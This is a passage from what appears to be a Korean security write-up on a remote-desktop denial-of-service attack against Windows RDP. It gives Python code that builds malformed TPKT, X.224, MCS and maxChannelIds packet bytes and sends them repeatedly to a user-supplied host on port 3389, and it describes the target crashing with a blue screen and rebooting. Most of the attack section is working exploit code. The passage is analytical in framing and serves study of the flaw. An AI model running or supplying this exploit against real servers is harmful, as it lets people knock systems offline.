변조</strong></p>\n<p>RDP 연결과정에서 발생되는 패킷의 변조를 통해 페이로드가 작성된다. 크게\nClient MCS Attach User Request PDU, maxChannelids filed, RDP connection\nrequest 부분으로 나눠진다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 114.44444444444446%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAXCAYAAAALHW+jAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAF7UlEQVQ4y4WVSWxbxx3G/5ItkrIi27KcyLUSJ7aSOOImkhLF7ZEU9+WRT2/l476J1OrYpqV4i+NESF00p/bUW089FZCc9Fa0LopeUvTiOM0hQHsJeiuQXtoeDFOYr6Ckprn1D3wYzGDwm+8PzMxHLzSN0GxSYmqKBjVE/7cGW04Q0WkimhkiukJEV66MjV2dMplm6IWqnkWj8VL8lVcmiOjCENEPiOgSEb1GRBePNU1Exu9BXz7WWePw8OSVsbHz2N01Ahii55r26vNq/XR8+tUpOjlyyWgwvj4yYnhrxGC4bDAYLxtNpssmk2nmtUtvjF52+wxkOjU5ajo1YTKdOmM0jU6Onjx57lO//9w/FWXsq3TaRCho0xTIEI5OPnksExEZ/isA1Giv0zcApYgmj9eHj11P/tLnP4duZ/TfimKkX8l6Vs5pn3P++J8SKfFpJCE8TWXlL8Ox3LNlqfSst33vi9t3H/7x9v2PnnzwyU9+pxXbTyw2368druBvXAvh37oXIu8A/xr+WhDHUSwa6GdiIZ9JSUgsFyEUm0jJFSi1LrJqDflCA2K5DbW+CmEwtrYQzGowWzyw2n2wzflhs3qXBq19KYjjTNcN9FNBSyRj+QOxvHFQatw8kArrB2p58yCvdA9kff27uV671a+37/WjMf1g1rrYt80F+nYnB7PN5x8AvxKkcQyAj5YL4UxShCx0oZXWmaiuQCmuIi+3IGsdiPIKNH0NstaFVGshEhUxZ/cxl5NjLlcQQScXxrd/OPHnQcsD4AdyyS9kFAiVGlMbK4wvVKA02uALVcjtNsSVNpRuB+rmGsRuE34+gUV7gHlcHPPNh6AthpNHDo+BUaE4m8ooCBZEltVLLKkUINeayFVqkFfbSBd0qK0u9NYGSt1NLGU1WOYCzOYKsrn5EN6wer09Lk5P8+JLh0Ce163x5DIK0hpbX73L7mz+CHfefYSdax9jp/MRbpYfoFd/iI5yA+tqD1q8BpfTzxacHOO8MfCL4SjRefqbop6HrhspGpOswaUMCrEyK2YaLBUREYvwCHFpxOIC4ollKPkK8qkC9OUGcpwAh93LFhwB5nYFkZ4PRgctPxOVgcMh8sZlcyjCQ8rXWKtxnZX0dbTq76LZuoVmu4dG9TpazR4UvYta+yaCcQlmm5fZHByz2P140+LxpeeDh68Cuk50jdfcfEJARq2xZa3B0vkicnIFybyOrFBANCkildewFM8jK5XAZVVYrV5mdwTY4T20+QJvWTyUnA+eYAPgHUEPpNISUmoNglplqXwBklyBWuqi1NyCWl5FrXMThcoaGms9cHERZquXOVxBZrX7MWtZDMyaF2nW4hk+tHk9r3sSyWXoUgvr3R3Wql/HVnsburICXahCyhRREhuQ0jqqUhN8SISfS7JwhGeReB4OFxdwzQdpwb10BPyEV+KpKA8lprFMWmaJmMBSaZGlExIT80WWSSlMyOosGRWZxJeYEFWZYyHE5lxB5vZE4XByAacrSA5X6Aj446yS4CJZCEtqv5yr96VEqV/iG/1iutYX03o/n9D6ilzpC4Le1/VGPxBI9O027wub3deftXqY2eLxmy2e/7X8iJfTS5EclnQJyo0OhNUKpI0KhG4VolKHoNahbHQhrrah9zYR5nMIOThEAwlw4QwslsWQxeIh25z/CPjzZc2bSIif8Y3u4+qte4/vP9za293t7L3/fmdvd3tz/8Pe2v4Pt6/tP9jq7D9679p+OSfsSVxqvxDPfWafD31qMS++c3XWTRar9yg9UNSniimZ+G6V9Ifb9Ptvn9Dn/3hMe1/8gh7cvkMf371PvRvvkdreoNWd+xRLK0QXZoloitLhNJ173UZX33aRxeY9+qKfa9r0X9XiuGC1nDGePXPRNGqcN50yOo2jxoVRk8l5YmTE6754cQbbO6e/rlYn/qKXJr5RCy8/VfVxetM93HaHhma+D3yh69PodCZSFy4MwujqcYq9TURmIpodIjozSLq/KwphZYVQqRypXCZUq4disvxdfP0H22N9E0Qxy34AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image32\"\n        title=\"image32\"\n        src=\"/static/1be439890c11143de1679b36745ebe81/32056/image32.png\"\n        srcset=\"/static/1be439890c11143de1679b36745ebe81/e9ff0/image32.png 180w,\n/static/1be439890c11143de1679b36745ebe81/f21e7/image32.png 360w,\n/static/1be439890c11143de1679b36745ebe81/32056/image32.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>2. RDP 연결 요청 인코딩 패킷 바이트 변조</strong></p>\n<p>TPKT, X.224, COTP 패킷 바이트를 추가한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.222222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAIAAABR8BlyAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAARUlEQVQI12Mwt3KxtXWvc/edGhA6JSh8in/o1MDwFt+QLv/QXHd/ZwdPTwdPDzsPN3sPN1t3PQNrPUMbPQMbfUMbbV1LAFfHEcnfalwIAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image33\"\n        title=\"image33\"\n        src=\"/static/6f577cca3a322b0b49a2817112615a7f/0a47e/image33.png\"\n        srcset=\"/static/6f577cca3a322b0b49a2817112615a7f/e9ff0/image33.png 180w,\n/static/6f577cca3a322b0b49a2817112615a7f/f21e7/image33.png 360w,\n/static/6f577cca3a322b0b49a2817112615a7f/0a47e/image33.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 546px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 70.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACSElEQVQoz4VSbU/TUBjtfyIkRoJijIgKaiQuhLGVsc25rSOKEOUlQCCa+K8wQUyECKO02/q2trfrvV1h3daX3eKy6miiyQJ6cvLkfLjn5p5zH2I+kU2lC8kU1We6kEwXEsk8VVhe39jd3Pr4Yjr69NlMLr+0kKRi8Vezc8k4mQkt84ksgTEOrkOv1wuCgFpcuXX7AYQwCILzc1NRFAhhp9Pp9XqO4xCe54WnMca6riOEfN//Yy4sroyMjktSFWMsCEK5XOY4TtM013VN0yQkqYqQAXUEIULI6GvY14ZRtywrl1+6M/b4++GRoqj7+1/39r4cHHw7PDyqVmWGYYk4mVlIUYlkfoAr7ze3tj+9jJDjD59H59LkQjYaS89GU3EyQyayMTITIzOEYdRt22m37QFaVstxnNfZNyOjE2dnLE3TP46Pi8XTk5PiSbFYPD1VVfVv5msL+7C6NfFoWgXAMFC5XBZEgWEYnucty7q4uCBc1w1uxvrGzpPJiK5DjLEoipIkKYqCEPI8r9lsErZtX15eYox93w9niPALl5bX7t2fAkBrNBo0TSuKUqlUdF1vt9uNRoOo1+vKFVRVDQUAoFarqSrwfT9PvRsavgsRMk2TYRiO40RRZFkWIWTb9o3PDjNnc2+Hhsd0Xe92uwCAUqkUXo0xbrVa/zD35+ra9uRUpFLhNA1wHEfTNM/zEMIw+X/apgr99RREEQDA87wsy4IgyLLMsmy/7WazGdYzgE6n0+3+3Nn9HJlJAE3zPJe/Qmh2HOf3ev4CdG6jgyLic7MAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 6 1\"\n        title=\"image 6 1\"\n        src=\"/static/0f10d19d14e33c6c5f4ab8fdea1fa850/76aed/image-6.1.png\"\n        srcset=\"/static/0f10d19d14e33c6c5f4ab8fdea1fa850/e9ff0/image-6.1.png 180w,\n/static/0f10d19d14e33c6c5f4ab8fdea1fa850/f21e7/image-6.1.png 360w,\n/static/0f10d19d14e33c6c5f4ab8fdea1fa850/76aed/image-6.1.png 546w\"\n        sizes=\"(max-width: 546px) 100vw, 546px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>RDP 연결 요청 인코딩 부분의 패킷 바이트를 변조한 여부를 페이로드\n부분에서 확인할 수 있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">buf<span class=\"token operator\">=</span>\\\"\\\"\n\nbuf<span class=\"token operator\">+=</span>\\\"\\\\x03\\\\x00\\\\x00\\\\x13\\\" \\# TPKT<span class=\"token punctuation\">,</span> Version <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> lenght <span class=\"token number\">19</span>\n\nbuf<span class=\"token operator\">+=</span>\\\"\\\\x0e\\\\xe0\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x08\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\" \\# ITU<span class=\"token operator\">-</span>T Rec X<span class=\"token punctuation\">.</span><span class=\"token number\">224</span></code></pre></div>\n<p>※ TPKT: 캡슐화 프로토콜이며 OSI 패킷을 자체 패킷의 데이터 페이로드로\n전달한 다음 결과 구조를 TCP</p>\n<p>프로토콜 통신으로 전달한 다음 패킷을 TCP/IP 패킷으로 처리한다.</p>\n<p><strong>3. Client MCS Attach User Request PDU 패킷 바이트 변조</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 6.666666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAT0lEQVQI1yXDOwqAMBBAQc8j4l/cfIgB3TWVV7C29eLvChYOTLV6ZZkSTy6858WdDOcOxCs+GPOSEaeI7GgwNBpnKmTZaftIN/zHaaNuhA9LQCE3OURzdwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image34\"\n        title=\"image34\"\n        src=\"/static/12a6ed143d08c18d2111c414c9975cb1/0a47e/image34.png\"\n        srcset=\"/static/12a6ed143d08c18d2111c414c9975cb1/e9ff0/image34.png 180w,\n/static/12a6ed143d08c18d2111c414c9975cb1/f21e7/image34.png 360w,\n/static/12a6ed143d08c18d2111c414c9975cb1/0a47e/image34.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>패킷 바이트 변조</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 548px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABb0lEQVQY0yWPXUvCYBTH92HqUqTL+hLRZV4mzUkgWtRF2AsWXfRRxDDNCqO66WVuShkynexxyFgM0fnohD0+e2wn3H5XPw7n/+ccribJNUl6e/8s3BTz+cJd5b4myXK90Wz+1OsNRWm3Wsrz82upXCnelh8eq8Vi6eNDFEVJFCVOSGYSQjohpHkhzSeWssun9g+OcxfXh0enm1ux7Vh8uZPM8In0Tnxvl08JyYyQzPB8igOAv4DFYsEYC51SDwBEUYpE17OnlwA+IcRxnHa7bVkWpXQ+n9u2vQz7vg8A4/HYMAxKaVgHAF/fzUh04+z8ijFmWZau65qm6bpumiYO4HzfXwR4AYyx0AFArjdWVteyJzkAGI1Gw+Gw0+kYhoExns1my7DnefMA13Wn02l4EiGEMWaav9Wnl5ok93o9hFC/31cURdM0hBDGeDKZcIQQ13XDlwaDQdgSTjDGAGDbtqqqCKFut9sPUFXVcRxK6T99hVNYb/7i/AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 6 1 1\"\n        title=\"image 6 1 1\"\n        src=\"/static/ffcbd3ec1c6f658afe738dd2d88abcd5/a58fe/image-6.1.1.png\"\n        srcset=\"/static/ffcbd3ec1c6f658afe738dd2d88abcd5/e9ff0/image-6.1.1.png 180w,\n/static/ffcbd3ec1c6f658afe738dd2d88abcd5/f21e7/image-6.1.1.png 360w,\n/static/ffcbd3ec1c6f658afe738dd2d88abcd5/a58fe/image-6.1.1.png 548w\"\n        sizes=\"(max-width: 548px) 100vw, 548px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>바이트 변조</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">buf<span class=\"token operator\">+=</span>\\\"\\\\x03\\\\x00\\\\x00\\\\x08\\\" \\# TPKT<span class=\"token punctuation\">,</span> Version <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> length <span class=\"token number\">8</span>\n\nbuf<span class=\"token operator\">+=</span>\\\"\\\\x02\\\\xf0\\\\x80\\\" \\# ITU<span class=\"token operator\">-</span>T Rec X<span class=\"token punctuation\">.</span><span class=\"token number\">224</span></code></pre></div>\n<p><strong>4. Connect-Initial영역의 targetParameters 필드 패킷 바이트 변조</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAo0lEQVQI1xXN3Q6CIBgAUJ+nGf61WaCYfAIfBiI6zK1u27rw/a9bL3BOQpm81AC9faHf1fTGsOm5Ew7kLMB1ve3B8rtpOApw9RWKipOMpYRmRZs0HBlHb9bDx4+LR9i//ilUUHrRGLRZlJ7FMIGacVxpo05pnZctydmZ0IT3I0jvpt3YqFVAsw76fw56MWYZbbQuPuwm8W9RJlNyy8qG5Kyouh950DCEdRQg4AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image35\"\n        title=\"image35\"\n        src=\"/static/3f636ecfcdc678008ddd12c02f89b2a2/d8f62/image35.png\"\n        srcset=\"/static/3f636ecfcdc678008ddd12c02f89b2a2/e9ff0/image35.png 180w,\n/static/3f636ecfcdc678008ddd12c02f89b2a2/f21e7/image35.png 360w,\n/static/3f636ecfcdc678008ddd12c02f89b2a2/d8f62/image35.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>변조</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 550px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA9ElEQVQI12NITctNSs6GoMSkrMLiqura5uqa5tralqamjrDwBDePwILCipralrz8ssiopMiopOiYlLT0/ITEDIa/f/78h4F///79/PEDwv779+////8Li6tMTB2ePXv288ePV69evn796u3bNx8/fvj16+evXz8Z8gvK8/LLICgnt7S4pLqtva+tvbe1rae9vS8+IcMvIKKsvLagsDwtPS86JiUhMSMuPj08IiE5JYfh4MHDJ06cPn781PHjpzZt2rp+/aYLFy5duXLt0uWrN27eys0rdXEL2LN3/+HDR3fs2L19x67Nm7dt3rJt27ad+/YdBAAkLJSVpB+jxwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 6 1 2\"\n        title=\"image 6 1 2\"\n        src=\"/static/2304c7bac2498acf0ebac31796cdead7/dd45a/image-6.1.2.png\"\n        srcset=\"/static/2304c7bac2498acf0ebac31796cdead7/e9ff0/image-6.1.2.png 180w,\n/static/2304c7bac2498acf0ebac31796cdead7/f21e7/image-6.1.2.png 360w,\n/static/2304c7bac2498acf0ebac31796cdead7/dd45a/image-6.1.2.png 550w\"\n        sizes=\"(max-width: 550px) 100vw, 550px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">buf<span class=\"token operator\">+=</span>\\\"\\\\x01\\\\x01\\\\x04\\\\x01\\\\x01\\\\x01\\\\x01\\\\xff\\\" \n\nbuf<span class=\"token operator\">+=</span>\\\"\\\\x30\\\\x19\\\\x02\\\\x04\\\\x00\\\\x00\\\\x00\\\\x00\\\"     \\# maxChannelids</code></pre></div>\n<p><strong>5. 변조 패킷 전송 부분</strong></p>\n<p>변조 패킷 덤프를 대상 서버로 RDP 기본 포트 3389를 향해 TCP 프로토콜\n통신을 진행한다. 연결이 성사되면 변조 패킷 덤프를 전송한후 그에 대한\n응답 값을 받은 후 연결이 종료된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">HOST <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 사용자측 인자 값 (대상 호스트 입력)</span>\n\nPORT <span class=\"token operator\">=</span> <span class=\"token number\">3389</span>        <span class=\"token comment\"># TCP/3389</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    <span class=\"token comment\"># IPv4 주소 사용/TCP 프로토콜 통신</span>\n\n    s <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span>\n\n    s<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>HOST<span class=\"token punctuation\">,</span>PORT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 연결 수립</span>\n\n    <span class=\"token keyword\">print</span> <span class=\"token string\">\"sending: %d bytes\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n\n    s<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span> <span class=\"token comment\">#페이로드 전송</span>\n\n    rec <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 대상 서버 응답 값</span>\n\n    <span class=\"token keyword\">print</span> <span class=\"token string\">\"received: %d bytes\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rec<span class=\"token punctuation\">)</span>\n\n    s<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 연결 종료</span></code></pre></div>\n<h3 id=\"공격-코드-실행\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89\" aria-label=\"공격 코드 실행 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 코드 실행</h3>\n<p><strong>1. 공격 코드 동작</strong></p>\n<p>변조되어진 패킷을 TCP 프로토콜 통신을 통해 전송한다. 공격자 측에서 보낸\n페이로드를 보낸 후 대상 서버는 정상적인 RDP 패킷으로 인지한후 응답 값을\n보낸다. 공격자 측에서 인터럽트를 걸지 않는 이상 계속 패킷을 전송한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAkElEQVQY043NQQ6CMBCFYU4DnZmWFoQGKW2lCiLGiBjvfxWDOwmJJt/ibf68aBrn4fz07czQAjkgC2RJ+FRZmVkhjcyaVBnkFUO9ErX9NN5el+u0N6GqQ6EdUBmzPIFyZSPu/XAK98Y/ZNZJdVR5J9JA4gC0cbWOd1xzrBN0QP5jGST8X3GMOllWybD4pn/Gb9nhOc77LxLpAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image36\"\n        title=\"image36\"\n        src=\"/static/2702685067c3204d6ec008aa7aeced75/d8f62/image36.png\"\n        srcset=\"/static/2702685067c3204d6ec008aa7aeced75/e9ff0/image36.png 180w,\n/static/2702685067c3204d6ec008aa7aeced75/f21e7/image36.png 360w,\n/static/2702685067c3204d6ec008aa7aeced75/d8f62/image36.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>2. 대상 서버 BSOD 장애 발생</strong></p>\n<p><strong>2.8.7</strong> 장에서 Metasploit maxchannelids module을 통해서 점검을 한 후\n발생한 BSOD 와 공격 코드를 통해보내 발생한 BSOD를 분석해본 결과 오류가\n발생하는 파일은 RDPWD.SYS, termdd.sys 인것을 유추할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACKUlEQVQozz2Ry27aUBCGB9tcfOFgH0O4GqhEqqaUS9q0iypSo/Y58gTddNNCUkACbDDmYnpZdNM3SBbdpIpCUZ+hEvu+B8hTnYOaxaf5j85o9M8/8PQ5aHkLyOOalnzSqJ7VGtWzerNydPoKtJenZvLtOwg/OprC+flveP3mO1TroDafhRO1pmocnxjm8YmsS4BQb3yDVMoH0PXurWF01opyeScIFzeC2P4pSa07UWqtBPH9GqB9oyi9ZTrtXVPqXmla71ZVuytN6/5SlI9rRemsZLn/Q9PGV+Fw6xpMc4aUTjGR8JCQCRqGx3U8PkFBsBFggITYf3O5OabTM/6vKC5q2h5VdTEctjEUYrQRstn5LpOZcZg2TW+n65MdpR7XojjcEWL/SadnW0q9rWHs//6j6+6OEHcny+MtQGsL5ZKPxaKPlrXglTkpFBaYzy8wm50jQD8gxN4Ui35gWT6WSj6Wy0vel0xOuWumCfEQ4ANCMrNAok8wErExGnU4sjy6f0vSMKDU2ZTKn4JcfoGm6SGle5hmQymd8BgAWggvSg5apoNReYy6PkFCWDZjXjlxN0gk7E3uwAsKmSmqyghlhjzCWMy5h2Wpqh2Ew9QQzbiNWtxlbvgRGKHQHoBBIEX6m2pmGFTNHipRG6Ox/TB2DLaJLDsYibCtLhEeVL5i5eEXPKx85o7YEEEYoCgOURCGPEPDcDbl8pJnaBV9PEhNeR/r2fcx7fCV/wFX0AvNQGI5fQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image37\"\n        title=\"image37\"\n        src=\"/static/73f5c20a69a40889040edd076c1c5a0d/d8f62/image37.png\"\n        srcset=\"/static/73f5c20a69a40889040edd076c1c5a0d/e9ff0/image37.png 180w,\n/static/73f5c20a69a40889040edd076c1c5a0d/f21e7/image37.png 360w,\n/static/73f5c20a69a40889040edd076c1c5a0d/d8f62/image37.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>원격 데스크톱 연결 기능이 활성화되어 있고 대상 IP 주소만 대입한 후\n공격을 수행을 하면 해당 컴퓨터는 BSOD 장애가 발생한후 일정 시간 후에\n자동 재부팅이 진행된다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAA9klEQVQoz63RTW6FIBAAYARM/CuCoICo8SIadaFijPc/zkuhafLSp6t+q4HJMAOAIAgAAMaY8zz3fbfWHsexOJOzbZvft9bu+y6lBAD4qh9JkhhjiqJgjCmlpJRa6cqp69oHSimEEPiLENL3fSlKQgillDGW5znnnBCSfWVZliUOhBB8RCkVQkROHMfYeRvvDoRQyqrrOqVk27aMMYyxTz3V+1zTNOu6juM4TdMwDGma+pQHndtToijinOc55ZxLKctvoiiKsqqE4KkThuFtf4QQhBAhhDH2sQ8+v/C/8Z1922dvN/cLrfWyLPM8n4+u69Ja/37BC5s+JmxwW1IcAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image38\"\n        title=\"image38\"\n        src=\"/static/84ecd43bb9b5a8a8e90f33a79579b119/d8f62/image38.png\"\n        srcset=\"/static/84ecd43bb9b5a8a8e90f33a79579b119/e9ff0/image38.png 180w,\n/static/84ecd43bb9b5a8a8e90f33a79579b119/f21e7/image38.png 360w,\n/static/84ecd43bb9b5a8a8e90f33a79579b119/d8f62/image38.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>이런 과정에서 그림 5‑5 나오면서 부팅 과정 대기 상태가 유지될 수 있으며\n복구를 하기 위해서는 관리자가 직접 수동으로 재부팅을 진행해야 정상\n부팅이 진행된다.</p>\n<h2 id=\"공격-기법-분석\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B6%84%EC%84%9D\" aria-label=\"공격 